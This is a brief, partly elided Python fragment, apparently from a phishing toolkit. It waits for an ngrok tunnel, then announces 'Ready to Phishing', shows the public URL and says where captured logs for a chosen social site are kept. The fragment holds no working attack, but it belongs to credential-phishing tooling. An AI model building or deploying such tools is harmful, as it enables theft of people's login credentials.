    ...
    while True:
        try:
            ...
            if ngrok_url.status_code == 200:
                ...
                print(bold(orange(' [~] Ready to Phishing')))
                print(bold(lightgreen(' [*] Ngrok URL: %s' % public_url)))
                print(bold(blue(' [~] Your logs are being stored in: Logs/{}').format(_social + strftime('-%y%m%d.txt'))))
                print(bold(yellow(' [^] Press Ctrl+C or VolDown+C(android) to quit')))
                yield public_url
                break
